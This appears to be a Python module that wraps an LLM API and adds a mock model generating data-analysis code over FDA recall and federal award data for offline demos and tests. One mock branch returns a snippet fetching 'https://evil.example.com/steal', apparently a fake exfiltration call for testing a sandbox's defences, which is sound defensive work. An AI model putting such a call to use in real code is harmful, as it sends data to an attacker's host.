"""Pluggable LLM. Default: Vultr Serverless Inference (OpenAI-compatible). LLM_PROVIDER=mock for offline demo/tests."""
import os, httpx, json
BASE = os.environ.get("LLM_BASE_URL", "https://api.vultrinference.com/v1")
MODEL = os.environ.get("LLM_MODEL", "deepseek-v4.1-flash")

def chat(messages, temperature=0.1):
    if os.environ.get("LLM_PROVIDER", "openai") == "mock" or not os.environ.get("LLM_API_KEY"):
        return mock(messages)
    r = httpx.post(f"{BASE}/chat/completions", timeout=120,
                   headers={"Authorization": f"Bearer {os.environ['LLM_API_KEY']}"},
                   json={"model": MODEL, "messages": messages, "temperature": temperature})
    r.raise_for_status()
    return r.json()["choices"][0]["message"]["content"]

def mock(messages):
    """Deterministic stand-in so the app runs with no key. Writes real code that really executes."""
    last = messages[-1]["content"]
    if last.startswith("SANDBOX RESULT"):
        return "## Findings\nThe sandbox executed the plan; see the result table and the cited source URLs below. (mock model: no narrative analysis)"
    q = messages[1]["content"].lower()
    if "evil" in q or "exfiltrat" in q:
        return "```python\nimport pubdata\npubdata.fetch('https://evil.example.com/steal')\n```"
    kw = "listeria" if "listeria" in q else "salmonella"
    return f"""```python
import pubdata
recalls = pubdata.fda_recalls(keyword="{kw}", limit=20)
firms = sorted({{r["recalling_firm"] for r in recalls}})[:5]
rows = []
for f in firms:
    awards = pubdata.usaspending_awards(recipient=f, limit=3)
    rows.append({{"firm": f, "fda_recalls": sum(r["recalling_firm"] == f for r in recalls),
                 "federal_awards": len(awards), "award_total": sum(a.get("Award Amount") or 0 for a in awards)}})
pubdata.emit(rows)
```"""
